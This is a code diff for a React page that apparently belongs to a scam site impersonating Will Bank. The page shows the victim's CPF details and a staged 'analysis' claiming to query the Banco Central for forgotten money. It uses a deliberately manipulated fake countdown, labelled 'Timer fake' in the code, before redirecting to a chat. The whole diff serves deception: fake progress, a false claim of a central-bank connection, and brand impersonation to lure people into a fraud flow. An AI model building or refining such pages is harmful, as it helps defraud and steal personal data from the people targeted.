@@ -1,6 +1,6 @@
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useState } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { CreditCard, User, Calendar, Users, Search, Play, Pause } from "lucide-react";
+import { CreditCard, User, Calendar, Users, Search, Clock } from "lucide-react";
 import WillBankHeader from "@/components/WillBankHeader";
 import WillBankCard from "@/components/WillBankCard";
 import WillBankFooter from "@/components/WillBankFooter";
@@ -8,13 +8,35 @@ import { CPFData } from "@/lib/cpf";
 import { Progress } from "@/components/ui/progress";
 import { saveSession, getSession } from "@/hooks/useSessionPersistence";
 
+const REAL_DURATION = 40;
+
+// Mapeia tempo real (0-40s) → tempo fake em segundos (960 = 16min, 0 = 0min)
+const fakeTimeMap = [
+  960, 950, 930, 910, 890, // 0-4s: 16:00 → 14:50
+  870, 820, 750, 680, 600, // 5-9s: desce rápido
+  650, 680, 700, 690, 670, // 10-14s: SOBE um pouco
+  620, 550, 480, 420, 380, 350, 320, 300, 280, 260, // 15-24s: desce
+  300, 340, 370, 350, 320, // 25-29s: SOBE de novo
+  280, 220, 160, 110, 80,  // 30-34s: desce rápido
+  60, 45, 30, 15, 5, 0     // 35-40s: finaliza
+];
+
+const messages = [
+  "Conectando ao Banco Central...",
+  "Verificando contas inativas...",
+  "Analisando valores esquecidos...",
+  "Consultando base do Will Bank...",
+  "Verificando histórico de transações...",
+  "Processando informações cadastrais...",
+  "Validando elegibilidade...",
+  "Calculando valores disponíveis...",
+  "Finalizando análise..."
+];
+
 const Video = () => {
   const navigate = useNavigate();
   const location = useLocation();
-  const videoRef = useRef<HTMLVideoElement>(null);
-  const [isPlaying, setIsPlaying] = useState(true);
-  const [videoProgress, setVideoProgress] = useState(0);
-  const [videoEnded, setVideoEnded] = useState(false);
+  const [realElapsed, setRealElapsed] = useState(0);
 
   // Try to get cpfData from location state or session
   const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
@@ -29,35 +51,36 @@ const Video = () => {
     saveSession({ cpfData, currentStep: "/video" });
   }, [cpfData, navigate]);
 
-  const handleVideoClick = () => {
-    if (videoRef.current) {
-      if (isPlaying) {
-        videoRef.current.pause();
-        setIsPlaying(false);
-      } else {
-        videoRef.current.play();
-        setIsPlaying(true);
-      }
-    }
-  };
+  // Timer real
+  useEffect(() => {
+    if (!cpfData) return;
 
-  const handleTimeUpdate = () => {
-    if (videoRef.current) {
-      const progress = (videoRef.current.currentTime / videoRef.current.duration) * 100;
-      setVideoProgress(progress);
-    }
-  };
+    const interval = setInterval(() => {
+      setRealElapsed(prev => {
+        if (prev >= REAL_DURATION) {
+          clearInterval(interval);
+          navigate("/chat", { state: { cpfData } });
+          return prev;
+        }
+        return prev + 1;
+      });
+    }, 1000);
 
-  const handleVideoEnd = () => {
-    setIsPlaying(false);
-    setVideoEnded(true);
-    // Navegar para o chat após o vídeo terminar
-    setTimeout(() => {
-      navigate("/chat", { state: { cpfData } });
-    }, 1500);
-  };
+    return () => clearInterval(interval);
+  }, [cpfData, navigate]);
 
   if (!cpfData) return null;
+
+  // Display
+  const fakeSeconds = fakeTimeMap[Math.min(realElapsed, 40)];
+  const displayMinutes = Math.floor(fakeSeconds / 60);
+  const displaySeconds = fakeSeconds % 60;
+  const progress = (realElapsed / REAL_DURATION) * 100;
+
+  // Mensagem rotativa (muda a cada ~5s)
+  const currentMessage = messages[Math.floor(realElapsed / 5) % messages.length];
+
+  const isComplete = realElapsed >= REAL_DURATION;
 
   const dataFields = [
     { icon: CreditCard, value: cpfData.cpf },
@@ -74,63 +97,32 @@ const Video = () => {
         <WillBankCard className="w-full max-w-2xl">
           <div className="space-y-4 sm:space-y-6">
             {/* Progress bar at top */}
-            <Progress value={videoProgress} className="h-1.5 sm:h-2" />
+            <Progress value={progress} className="h-1.5 sm:h-2" />
 
-            {/* Video Player */}
-            <div className="relative aspect-video bg-black rounded-xl sm:rounded-2xl overflow-hidden shadow-xl">
-              <video
-                ref={videoRef}
-                src="/video/video_consulta.mp4?v=2"
-                className="absolute inset-0 w-full h-full object-cover"
-                playsInline
-                autoPlay
-                muted={false}
-                onTimeUpdate={handleTimeUpdate}
-                onEnded={handleVideoEnd}
-                onClick={handleVideoClick}
-              />
+            {/* Analysis Screen */}
+            <div className="relative aspect-video bg-gradient-to-br from-primary/10 to-primary/5 rounded-xl sm:rounded-2xl overflow-hidden shadow-xl flex flex-col items-center justify-center">
+              {/* Ícone animado */}
+              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-primary/20 rounded-full flex items-center justify-center mb-4">
+                <Search className={`w-8 h-8 sm:w-10 sm:h-10 text-primary ${!isComplete ? 'animate-pulse' : ''}`} />
+              </div>
               
-              {/* Play/Pause Overlay */}
-              {!isPlaying && !videoEnded && (
-                <div 
-                  className="absolute inset-0 flex items-center justify-center bg-black/40 cursor-pointer"
-                  onClick={handleVideoClick}
-                >
-                  <div className="w-16 h-16 sm:w-20 sm:h-20 bg-primary rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform">
-                    <Play className="w-8 h-8 sm:w-10 sm:h-10 text-primary-foreground ml-1" fill="currentColor" />
-                  </div>
-                  <div className="absolute bottom-4 left-4 right-4 text-center">
-                    <p className="text-white text-xs sm:text-sm font-medium bg-black/50 backdrop-blur-sm rounded-full px-4 py-2">
-                      👆 Toque para assistir a mensagem importante
-                    </p>
-                  </div>
-                </div>
-              )}
-
-              {/* Video Ended Overlay */}
-              {videoEnded && (
-                <div className="absolute inset-0 flex items-center justify-center bg-black/60">
-                  <div className="text-center text-white">
-                    <div className="w-16 h-16 mx-auto bg-green-500 rounded-full flex items-center justify-center mb-3">
-                      <Search className="w-8 h-8 animate-pulse" />
-                    </div>
-                    <p className="font-bold text-base sm:text-lg">Finalizando consulta...</p>
-                    <p className="text-sm opacity-80">Aguarde um momento</p>
-                  </div>
-                </div>
-              )}
-
-              {/* Pause indicator */}
-              {isPlaying && (
-                <div 
-                  className="absolute inset-0 cursor-pointer"
-                  onClick={handleVideoClick}
-                >
-                  <div className="absolute bottom-3 right-3 bg-black/60 backdrop-blur-sm rounded-full p-2 opacity-0 hover:opacity-100 transition-opacity">
-                    <Pause className="w-5 h-5 text-white" />
-                  </div>
-                </div>
-              )}
+              {/* Texto principal */}
+              <h2 className="text-lg sm:text-xl font-bold text-foreground mb-2">
+                {isComplete ? "Análise concluída!" : "Analisando seus dados..."}
+              </h2>
+              
+              {/* Mensagem rotativa */}
+              <p className="text-muted-foreground text-sm mb-4 text-center px-4">
+                {isComplete ? "Redirecionando..." : currentMessage}
+              </p>
+              
+              {/* Timer fake */}
+              <div className="flex items-center gap-2 bg-black/10 px-4 py-2 rounded-full">
+                <Clock className="w-4 h-4 text-muted-foreground" />
+                <span className="font-mono font-bold text-foreground">
+                  {String(displayMinutes).padStart(2, '0')}:{String(displaySeconds).padStart(2, '0')}
+                </span>
+              </div>
             </div>
 
             {/* User Data Card */}
@@ -151,10 +143,10 @@ const Video = () => {
                 {/* Consulta Status */}
                 <div className="flex items-center gap-3 p-3 sm:p-4 bg-primary/5">
                   <div className="w-9 h-9 sm:w-11 sm:h-11 bg-primary/20 rounded-lg sm:rounded-xl flex items-center justify-center">
-                    <Search className={`w-4 h-4 sm:w-5 sm:h-5 text-primary ${!videoEnded ? 'animate-pulse' : ''}`} />
+                    <Search className={`w-4 h-4 sm:w-5 sm:h-5 text-primary ${!isComplete ? 'animate-pulse' : ''}`} />
                   </div>
-                  <span className={`font-medium text-sm sm:text-base ${videoEnded ? 'text-success' : 'text-muted-foreground'}`}>
-                    {videoEnded ? "✓ Consulta finalizada!" : "Assista o vídeo para continuar..."}
+                  <span className={`font-medium text-sm sm:text-base ${isComplete ? 'text-success' : 'text-muted-foreground'}`}>
+                    {isComplete ? "✓ Análise concluída!" : "Análise em andamento..."}
                   </span>
                 </div>
               </div>
